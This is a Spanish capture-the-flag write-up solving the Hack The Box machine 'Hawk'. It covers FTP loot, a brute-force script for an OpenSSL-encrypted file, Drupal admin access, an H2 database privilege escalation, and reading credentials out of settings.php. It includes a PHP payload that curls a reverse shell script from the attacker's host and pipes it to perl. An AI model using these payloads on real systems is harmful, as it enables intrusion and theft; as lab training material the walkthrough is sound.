Hola !  
Esta semana, se retiró `HAWK` de HTB, una máquina de dificultad media, la cual posee un entretenido privesc, aquí va mi solución :) ! 

![HawkIcon](https://cntr0llz.cl/wp-content/uploads/2018/12/hawkicon.png)

  
1. [Recon](#Recon)
2. [user.txt](#user.txt)
3. [root.txt](#root.txt)




## Recon

Para comenzar, veremos el output del escaneo de puertos:

`nmap -sC -sV -A -T5 -o hawk.nmap 10.10.10.102` 

![Nmap image](https://cntr0llz.cl/wp-content/uploads/2018/12/nmap.png)

Una vez obtenido el resultado, se se logran ver un par de cosas interesantes:  

* ftp
* ssh
* Portal drupal, puerto 80 (CMS drupal)
* H2 SQL - database manager


## user.txt

Si vamos en orden con los puertos, veremos qué dentro del ftp hay un par de archivos, el login anónimo está activado, aprovechando esto, podemos descargar el contenido.  Veremos que es un archivo encriptado con ssl:  

![FTP](https://cntr0llz.cl/wp-content/uploads/2018/12/ftp1-1.png)  
  
	  
		
![FILE](https://cntr0llz.cl/wp-content/uploads/2018/12/file-1.png)

Hay 2 maneras simples de desencriptar el archivo: 

* openssl
* bruteforce-salted-openssl

Lo que buscaremos es la `phassphrase` con la que fue encriptado el mensaje...  

Optamos por hacer un pequeño script en python que itere sobre los CBC ciphers y digests disponibles (Bastantes).


```python

import time
import subprocess
import sys

cip = open("ciphers.txt",'r')
dig = open("digests.txt",'r')
cmd = ''
ciphers = []
digg = []
for c in cip:
    ciphers.append(c.strip().split()[0])
for d in dig:
    digg.append(d.strip().split()[0])
cip.close()
dig.close()
#print ciphers
#print digg
for c in ciphers:
    cmd = ''
    for d in digg:
        cmd = ""
        cmd+="bruteforce-salted-openssl -c "  
        cmd+= c
        cmd+=" -d "
        cmd+=d
        cmd+=" -1 -N -f dict drupal.txt"
        output = subprocess.check_output(cmd,  stderr=subprocess.STDOUT, shell=True)
        out = output.strip()
        out = out.split()
        if 'candidate:' in out:
            print "FOUND"
            print cmd
            print output
            sys.exit(0)
        #time.sleep(0.05)

```
  
	   
		 
Nota: Si nos vamos de cabeza con `rockyou.txt`, tendremos para medio año, así que usaremos un diccionario estilo `1000commons.txt`.  


![output script](https://cntr0llz.cl/wp-content/uploads/2018/12/scriptout-1.png)    
  
	  
		

Una vez desencriptado el mensaje, podemos conseguir un potencial nombre de usuario `daniel` y una potencial password `PencilKeyboardScanner123`  
  
  
![decrypted](https://cntr0llz.cl/wp-content/uploads/2018/12/decrypted-1.png)


Si vamos ahora al puerto 80, donde está el CMS drupal, podemos probar un par de credenciales, hasta dar con la que corresponde :  


` admin:PencilKeyboardScanner123 `  
  
	

Dentro del gestor de contenido, podemos darnos unas vueltas y ver como funciona.
Si observamos la pestaña `m̀odules`, podremos habilitar un módulo que permite que el servidor evalue código `PHP`, y luego crear una entrada con código php.


```
<?php
	echo system("curl 10.10.16.74:8000/oneline_rev.pl | perl");
?>
```

Con esto, y teniendo un servidior http sirviendo ( `$ python -m SimpleHTTPServer` ) la reverse shell, logramos obtener la shell como `www-data`


![www-data reverse](https://cntr0llz.cl/wp-content/uploads/2018/12/shell-1.png)

  
	

Una vez dentro, obtenemos el posible usuario `daniel`, y su user.txt

![user.txt](https://cntr0llz.cl/wp-content/uploads/2018/12/user.png)
  
## root.txt

Enumerando un poco obtenemos un par de cosas interesantes, aunque lo que más llama la atención, es lo que vimos en el scan de `nmap`, el gestor de bases de datos SQL `H2` que además lo corre como `root`. Si investigamos un poco de este manager, podemos obtener mucha información interesante, por el momento, deseamos entrar a ver qué hay.  
Si entramos a `http://10.10.10.102:8082`, veremos que solo es visible desde adentro, por lo que tendremos que optar por un forwardeo de puertos, aquí tenemos 2 opciones para lograr un forwardeo de puertos.  
  
	
	* Buscar un usuario dentro ( Daniel), para lograr conectarnos por ssh hacia adentro.
	* Forwardear de manera inversa, osea, correr ssh en nuestra máquina local y bindear inversamente el puerto.

Haremos la segunda opción, btw, si se desean obtener las credenciales de daniel, deberemos buscar en las configuraciones de php

```console
$ cat /var/www/html/sites/default/settings.php | grep password
```

Obtenemos las credenciales: `daniel:drupal4hawk`

Como optamos por hacer el forwarding inverso, debemos poner a la escucha un servicio ssh en nuestra máquina local:

`$ systemctl start sshd`

Y luego conectarnos:  


```console
 $ ssh -R 5555:localhost:8082 fade@10.10.14.5 
```

Con esto, le diremos a `ssh` que bindee el puerto 5555 de la máquina donde nos estamos conectando, a nuestro localhost:8082

Habiendo hecho esto, ya tendremos acceso al portal de `h2`

![h2 database](https://cntr0llz.cl/wp-content/uploads/2018/12/h2porta-1.png)

una vez aquí, podemos investigar como funciona el portal, y buscar las credenciales por defecto, que son: `sa:`.
Aunque la plataforma nos diga que las credenciales están erróneas, puede ser que sea otro el error, si cambiamos la dirección de la DB.

`jdbc:h2:~/test` -> `jdbc:h2:~`  

boom, entramos !  

Una vez dentro, vemos que el portal nos permite correr comandos `SQL`... Pero teniendo en cuenta que esta aplicación está hecha en java, podemos leer de la documentación que somos capaces de crear un `alias` de un comando java, por tanto, ejecución de código. [(REF)](http://h2database.com/html/grammar.html#create_alias)   


![payload](https://cntr0llz.cl/wp-content/uploads/2018/12/getreverse-1.png)  

Esto, junto con un archivo creado previamente que contenga una reverse shell previamente escrita en `/tmp/escalate.sh`, podremos ejecutarla y conseguir la reverse shell como root. [(reverses shells)](https://github.com/jcatala/h4ckme)

![root.txt](https://cntr0llz.cl/wp-content/uploads/2018/12/root.png)

yay !  

Espero que se haya entendido todo, cualquier consulta no duden en preguntar (: !

Se despide: 
	![f4d3b4dg3](https://www.hackthebox.eu/badge/image/40513)
	`Happy - h4ck1ng 4fun&$$! `




